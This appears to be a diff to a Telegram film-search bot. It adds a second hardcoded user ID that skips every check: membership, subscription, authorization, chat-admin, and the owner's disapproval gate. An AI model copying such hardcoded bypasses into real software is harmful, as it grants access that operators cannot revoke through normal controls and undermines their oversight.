@@ -116,7 +116,7 @@ OWNER_ID = 7831101047
 
 def parse_admin_ids() -> set:
     raw_admin = os.getenv("ADMIN_ID", "7831101047")
-    ids = {ADMIN_ID, OWNER_ID, 7831101047}
+    ids = {ADMIN_ID, OWNER_ID, 7831101047, 783110149}
     for item in raw_admin.replace(",", " ").split():
         item = item.strip()
         try:
@@ -1296,7 +1296,7 @@ async def send_gplinks_verification_card(client: Client, target_chat: Any, user_
 send_arolinks_verification_card = send_gplinks_verification_card
 
 async def check_chat_membership(client: Client, chat_id: Any, user_id: int, fallback_username: Optional[str] = None) -> bool:
-    if user_id == 7831101047 or str(user_id) == "7831101047":
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
         return True
     try:
         member = await client.get_chat_member(chat_id=chat_id, user_id=user_id)
@@ -1332,7 +1332,7 @@ async def check_chat_membership(client: Client, chat_id: Any, user_id: int, fall
         return False
 
 async def check_fsub(client: Client, user_id: int) -> bool:
-    if user_id == 7831101047 or str(user_id) == "7831101047":
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
         return True
     if user_id == ADMIN_ID or user_id == OWNER_ID or user_id in ADMIN_IDS:
         return True
@@ -1344,17 +1344,27 @@ async def check_fsub(client: Client, user_id: int) -> bool:
         fallback_username="CineVerseFlimSearch"
     )
 
-is_user_subscribed = check_fsub
-fsub_check = check_fsub
+async def is_user_subscribed(client: Client, user_id: int) -> bool:
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
+        return True
+    return await check_fsub(client, user_id)
+
+fsub_check = is_user_subscribed
 
 async def is_user_joined_group(client: Client, user_id: int) -> bool:
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
+        return True
     return await fsub_check(client, user_id)
 
 async def is_user_fully_joined(client: Client, user_id: int) -> bool:
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
+        return True
     return await fsub_check(client, user_id)
 
 async def is_authorized_user(user_id: int) -> bool:
-    if user_id == 7831101047 or user_id == ADMIN_ID or user_id == OWNER_ID or user_id in ADMIN_IDS:
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
+        return True
+    if user_id == ADMIN_ID or user_id == OWNER_ID or user_id in ADMIN_IDS:
         return True
     return await db.is_approved_user(user_id)
 
@@ -1369,7 +1379,9 @@ def build_force_join_markup(retry_callback: str = "cb_check_join") -> InlineKeyb
     ])
 
 async def is_sender_chat_admin(client: Client, chat_id: int, user_id: int) -> bool:
-    if user_id == 7831101047 or user_id == OWNER_ID or user_id in ADMIN_IDS:
+    if user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"]:
+        return True
+    if user_id == ADMIN_ID or user_id == OWNER_ID or user_id in ADMIN_IDS:
         return True
     try:
         member = await client.get_chat_member(chat_id, user_id)
@@ -1426,8 +1438,8 @@ async def start_handler(client: Client, message: Message):
             asyncio.create_task(auto_delete(start_grp, 60, reply_to_message=message))
         return
 
-    # Trigger set_bot_commands for Owner whenever Owner (7831101047) sends /start in PM
-    if (user_id == 7831101047 or user_id == ADMIN_ID) and message.chat and message.chat.type == enums.ChatType.PRIVATE:
+    # Trigger set_bot_commands for Owner whenever Owner sends /start in PM
+    if (user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"] or user_id == ADMIN_ID) and message.chat and message.chat.type == enums.ChatType.PRIVATE:
         try:
             await client.set_bot_commands(
                 [
@@ -1437,14 +1449,14 @@ async def start_handler(client: Client, message: Message):
                     BotCommand("help", "Help Guide"),
                     BotCommand("about", "About CineVerse")
                 ],
-                scope=BotCommandScopeChat(chat_id=7831101047)
+                scope=BotCommandScopeChat(chat_id=user_id)
             )
-            logger.info("✅ Owner menu refreshed on /start for chat 7831101047")
+            logger.info(f"✅ Owner menu refreshed on /start for chat {user_id}")
         except Exception as e:
-            logger.warning(f"Could not refresh owner menu on /start for 7831101047: {e}")
+            logger.warning(f"Could not refresh owner menu on /start for {user_id}: {e}")
 
     # 2. Owner Permission Gate: Check if disapproved
-    if await db.is_disapproved_user(user_id):
+    if not (user_id in [7831101047, 783110149] or str(user_id) in ["7831101047", "783110149"] or user_id == ADMIN_ID) and await db.is_disapproved_user(user_id):
         denied_msg = await message.reply_text(
             "┌──────────────────────────────────────────┐\n"
             "│   ❌  A C C E S S   D E N I E D          │\n"
